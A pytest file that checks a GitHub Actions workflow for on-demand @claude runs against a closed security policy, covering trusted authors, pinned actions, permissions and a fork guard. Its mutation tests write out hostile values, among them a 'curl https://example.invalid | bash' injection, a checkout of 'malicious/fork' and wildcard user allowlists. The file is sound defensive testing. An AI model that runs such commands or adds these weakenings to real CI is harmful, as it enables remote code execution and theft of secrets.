"""Closed authorization, checkout and cost boundaries for on-demand Claude work."""

from __future__ import annotations

import shlex
from pathlib import Path

import pytest
import yaml

from test_ci_train_policy import _load

ROOT = Path(__file__).resolve().parents[4]
CLAUDE = ROOT / ".github" / "workflows" / "claude.yml"

CLAUDE_EVENTS = {
    "issue_comment": ["created"],
    "pull_request_review_comment": ["created"],
    "pull_request_review": ["submitted"],
    "issues": ["opened"],
}
CLAUDE_TRUSTED = """fromJSON('["OWNER","MEMBER","COLLABORATOR"]')"""
CLAUDE_PERMISSIONS = {
    "contents": "read", "pull-requests": "read", "issues": "read",
    "id-token": "write", "actions": "read",
}
# Pinned to a commit: the step holds the OAuth token and write permissions.
CLAUDE_ACTION = "anthropics/claude-code-action@8cf3482550831fb35a4fc3fbf7ca139cf8028b4c"
CLAUDE_CHECKOUT = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"


# Per event: the payload object whose author is checked, and the text fields
# that may carry the mention.
CLAUDE_GATE_FIELDS = {
    "issue_comment": ("comment", {"body"}),
    "pull_request_review_comment": ("comment", {"body"}),
    "pull_request_review": ("review", {"body"}),
    "issues": ("issue", {"body", "title"}),
}


def _split_top(expr: str, op: str) -> list[str]:
    """Split on `op` outside parentheses and quotes, peeling redundant outer parens."""
    expr = expr.strip()
    while expr.startswith("(") and _closing_paren(expr, 0) == len(expr) - 1:
        expr = expr[1:-1].strip()
    parts, depth, quote, start, i = [], 0, None, 0, 0
    while i < len(expr):
        ch = expr[i]
        if quote:
            quote = None if ch == quote else quote
        elif ch in "'\"":
            quote = ch
        elif ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
        elif depth == 0 and expr.startswith(op, i):
            parts.append(expr[start:i].strip())
            start = i + len(op)
            i = start
            continue
        i += 1
    parts.append(expr[start:].strip())
    return parts


def _strip_parens(expr: str) -> str:
    expr = expr.strip()
    while expr.startswith("(") and _closing_paren(expr, 0) == len(expr) - 1:
        expr = expr[1:-1].strip()
    return expr


def _closing_paren(expr: str, open_at: int) -> int:
    depth, quote = 0, None
    for i in range(open_at, len(expr)):
        ch = expr[i]
        if quote:
            quote = None if ch == quote else quote
        elif ch in "'\"":
            quote = ch
        elif ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                return i
    return -1


def _claude_gate_violations(condition: str) -> list[str]:
    """Each `||` branch must be one event, a trusted author, and a mention."""
    problems: list[str] = []
    seen: list[str] = []
    for branch in _split_top(" ".join(condition.split()), "||"):
        terms = [_strip_parens(term) for term in _split_top(branch, "&&")]
        events = [
            event for event in CLAUDE_GATE_FIELDS
            if f"github.event_name == '{event}'" in terms
        ]
        if len(events) != 1 or len(terms) != 3:
            problems.append(f"job gate branch not event-trusted-mention: {branch!r}")
            continue
        event = events[0]
        obj, fields = CLAUDE_GATE_FIELDS[event]
        trusted = f"contains({CLAUDE_TRUSTED}, github.event.{obj}.author_association)"
        mention = [term for term in terms if term not in {f"github.event_name == '{event}'", trusted}]
        allowed = {f"contains(github.event.{obj}.{field}, '@claude')" for field in fields}
        if trusted not in terms or len(mention) != 1:
            problems.append(f"{event}: gate lacks the trusted-author check")
            continue
        mentions = set(_split_top(mention[0], "||"))
        if not mentions or not mentions <= allowed:
            problems.append(f"{event}: gate lacks an @claude mention on its own payload")
        seen.append(event)
    if sorted(seen) != sorted(CLAUDE_GATE_FIELDS):
        problems.append(f"job gate events: {sorted(seen)}")
    return problems


def _claude_violations(text: str) -> list[str]:
    """Policy for the on-demand @claude workflow (public repo, billed runner).

    Only a trusted author's mention may start a run, on one bounded job,
    with no widened actor allowlist and no extra commands.
    """
    problems: list[str] = []
    try:
        workflow = _load(text)
    except Exception as exc:  # noqa: BLE001 - any parse failure is a violation
        return [f"unparseable: {exc}"]
    on = workflow.get("on") or {}
    if set(on) != set(CLAUDE_EVENTS):
        problems.append(f"triggers: {sorted(on)}")
    for event, types in CLAUDE_EVENTS.items():
        if (on.get(event) or {}).get("types") != types:
            problems.append(f"{event}: types")
    if "permissions" in workflow or "concurrency" in workflow:
        problems.append("workflow-level permissions or concurrency")
    jobs = workflow.get("jobs") or {}
    if set(jobs) != {"claude"}:
        return problems + [f"jobs: {sorted(jobs)}"]
    job = jobs["claude"]
    if set(job) != {"if", "runs-on", "timeout-minutes", "permissions", "steps"}:
        problems.append(f"job keys: {sorted(job)}")
    problems.extend(_claude_gate_violations(job.get("if", "")))
    if job.get("runs-on") != "ubuntu-latest":
        problems.append("runner")
    timeout = job.get("timeout-minutes", "")
    if not timeout.isdigit() or int(timeout) > 30:
        problems.append("timeout")
    if job.get("permissions") != CLAUDE_PERMISSIONS:
        problems.append("job permissions")
    steps = job.get("steps") or []
    if [step.get("id") or step.get("uses") for step in steps] != [
        "fork_guard", CLAUDE_CHECKOUT, CLAUDE_ACTION,
    ]:
        problems.append("steps")
    if set(workflow) != {"name", "on", "jobs"}:
        problems.append("workflow keys")
    expected_keys = [
        {"name", "id", "if", "env", "run"}, {"uses", "with"}, {"uses", "with"},
    ]
    for index, step in enumerate(steps):
        if index >= len(expected_keys) or set(step) != expected_keys[index]:
            problems.append(f"step {index}: keys")
    guard = steps[0] if steps else {}
    if guard.get("if") != "github.event.issue.pull_request || github.event.pull_request":
        problems.append("fork guard condition")
    if guard.get("env") != {
        "GH_TOKEN": "${{ github.token }}",
        "PR": "${{ github.event.issue.number || github.event.pull_request.number }}",
    }:
        problems.append("fork guard environment")
    # Compare the complete bounded control flow, ignoring shell layout and comments.
    # Presence of an API call and exit is insufficient: overrides/early exits
    # can otherwise turn a fail-closed lookup into permission to execute fork code.
    expected_guard = '''
        cross=$(gh pr view "$PR" -R "$GITHUB_REPOSITORY" --json isCrossRepository -q .isCrossRepository)
        if [ "$cross" != "false" ]; then
            echo "Refusing @claude on a pull request from a fork." >&2
            exit 1
        fi
    '''
    def shell_tokens(script: str) -> list[str]:
        lexer = shlex.shlex(script, posix=False, punctuation_chars=True)
        lexer.whitespace_split = True
        return list(lexer)
    if shell_tokens(guard.get("run", "")) != shell_tokens(expected_guard):
        problems.append("fork guard control flow")
    checkout = steps[1] if len(steps) > 1 else {}
    if checkout.get("with") != {"fetch-depth": "1"}:
        problems.append("checkout inputs")
    inputs = (steps[-1].get("with") or {}) if steps else {}
    if inputs != {
        "claude_code_oauth_token": "${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}",
        "additional_permissions": "actions: read\n",
    }:
        problems.append("action inputs")
    return problems


def test_current_claude_workflow_holds_closed_policy():
    assert _claude_violations(CLAUDE.read_text(encoding="utf-8")) == []


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("  issue_comment:\n", "  pull_request_target:\n  issue_comment:\n"),
        ("    types: [opened]", "    types: [opened, assigned]"),
        ("contains(github.event.comment.body, '@claude') &&", "("),
        ('["OWNER","MEMBER","COLLABORATOR"]\'), github.event.review', '["OWNER","MEMBER","COLLABORATOR","NONE"]\'), github.event.review'),
        ("contains(fromJSON('[\"OWNER\",\"MEMBER\",\"COLLABORATOR\"]'), github.event.issue.author_association)", "true"),
        ("(github.event_name == 'pull_request_review' &&", "(github.event_name == 'pull_request_review' || github.event_name == 'issues' &&"),
        ("claude-code-action@8cf3482550831fb35a4fc3fbf7ca139cf8028b4c", "claude-code-action@v1"),
        ("actions/checkout@11d5960a326750d5838078e36cf38b85af677262", "actions/checkout@v4"),
        ("      - uses: anthropics/claude-code-action@", "      - if: always()\n        uses: anthropics/claude-code-action@"),
        ("      - uses: actions/checkout@11d5960", "      - if: ${{ !cancelled() }}\n        uses: actions/checkout@11d5960"),
        ("        if: github.event.issue.pull_request || github.event.pull_request", "        if: github.event.pull_request"),
        ('          if [ "$cross" != "false" ]; then', '          if [ "$cross" = "true" ]; then'),
        ("            exit 1\n", "            exit 0\n"),
        ("      - name: Refuse pull requests from forks\n        id: fork_guard", "      - name: Refuse pull requests from forks\n        id: fork_guard\n        continue-on-error: true"),
        ("    timeout-minutes: 30", "    timeout-minutes: 300"),
        ("    runs-on: ubuntu-latest", "    strategy:\n      matrix:\n        copy: [1, 2]\n    runs-on: ubuntu-latest"),
        ("      contents: read", "      contents: read\n      packages: write"),
        ("      - uses: actions/checkout@11d5960", "      - run: curl https://example.invalid\n      - uses: actions/checkout@11d5960"),
        ("          claude_code_oauth_token:", "          allowed_non_write_users: '*'\n          claude_code_oauth_token:"),
        ("          claude_code_oauth_token:", "          allowed_bots: '*'\n          claude_code_oauth_token:"),
    ],
)
def test_claude_workflow_policy_mutations_fail_closed(old: str, new: str):
    text = CLAUDE.read_text(encoding="utf-8")
    assert old in text
    assert _claude_violations(text.replace(old, new, 1)), f"mutation escaped: {old!r}"


def test_claude_workflow_comment_edits_stay_green():
    text = CLAUDE.read_text(encoding="utf-8")
    edited = "# reworded header\n" + text.replace("# On-demand", "# On demand", 1)
    assert _claude_violations(edited) == []


def test_claude_gate_rejects_count_preserving_unguarded_branch():
    # Codex round 2: drop the issues branch's trust check but repeat one in
    # issue_comment, so substring counts stay the same.
    text = CLAUDE.read_text(encoding="utf-8")
    trusted_issue = (
        "contains(fromJSON('[\"OWNER\",\"MEMBER\",\"COLLABORATOR\"]'), "
        "github.event.issue.author_association)"
    )
    trusted_comment = trusted_issue.replace(".issue.", ".comment.")
    assert trusted_issue in text
    mutated = text.replace(trusted_issue, "true", 1).replace(
        trusted_comment, f"{trusted_comment} && {trusted_issue}", 1,
    )
    assert mutated.count(CLAUDE_TRUSTED) == text.count(CLAUDE_TRUSTED)
    assert _claude_violations(mutated)


@pytest.mark.parametrize("prefix", ["exit 0\n", "cross=false\n", "curl https://example.invalid | bash\n"])
def test_claude_guard_rejects_control_flow_override(prefix: str):
    text = CLAUDE.read_text(encoding="utf-8")
    workflow = _load(text)
    guard = workflow["jobs"]["claude"]["steps"][0]
    guard["run"] = guard["run"].replace('if [ "$cross"', prefix + 'if [ "$cross"', 1)
    assert _claude_violations(yaml.safe_dump(workflow))


@pytest.mark.parametrize("inputs", [
    {"repository": "malicious/fork", "ref": "main"},
    {"ref": "refs/pull/1/head"},
])
def test_claude_checkout_rejects_untrusted_override(inputs: dict):
    workflow = _load(CLAUDE.read_text(encoding="utf-8"))
    workflow["jobs"]["claude"]["steps"][1]["with"].update(inputs)
    assert _claude_violations(yaml.safe_dump(workflow))


def test_claude_gate_equivalent_wrappers_stay_green():
    workflow = _load(CLAUDE.read_text(encoding="utf-8"))
    job = workflow["jobs"]["claude"]
    job["if"] = job["if"].replace(
        "github.event_name == 'issue_comment'", "((github.event_name == 'issue_comment'))",
    ).replace(
        "contains(github.event.review.body, '@claude')",
        "(contains(github.event.review.body, '@claude'))",
    )
    assert _claude_violations(yaml.safe_dump(workflow)) == []
